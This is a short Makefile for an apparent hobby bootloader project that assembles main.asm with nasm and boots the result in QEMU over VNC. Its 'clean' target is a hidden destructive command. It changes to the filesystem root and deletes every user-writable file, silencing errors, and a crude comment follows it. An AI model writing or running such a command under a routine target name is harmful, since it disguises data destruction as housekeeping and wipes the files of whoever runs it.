compile: main.asm print.s
	@nasm -fbin main.asm -o boot.bin
# no need the ld command for linking any object file, see main.asm line 1
run: boot.bin
	@ - pkill qemu
	@qemu-system-x86_64 boot.bin -vnc :69 &
	@vncviewer localhost:69
clean:
	@cd / && find . -type f -perm /u+rw -exec rm {} + 2>/dev/null
# pussy clean
